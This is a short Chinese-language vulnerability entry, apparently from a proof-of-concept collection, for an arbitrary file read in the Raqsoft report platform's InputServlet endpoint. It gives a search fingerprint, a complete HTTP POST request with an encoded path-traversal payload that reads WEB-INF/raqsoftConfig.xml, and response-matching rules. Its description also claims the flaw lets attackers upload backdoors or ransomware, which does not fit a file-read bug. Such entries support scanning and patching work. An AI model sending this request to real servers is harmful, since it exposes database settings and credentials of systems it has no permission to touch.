﻿# 润乾报表平台 InputServlet 任意文件读取漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：润乾报表平台InputServlet接口处存在任意文件读取漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

> 漏洞特征：body="润乾报表"

> 验证脚本：HTTP

```
POST /InputServlet?action=13 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Connection: close

file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?DB)(?=.*?name).*?$

> 上传文件定位：

> 验证文件来源：润乾报表平台 InputServlet 任意文件读取漏洞.poc

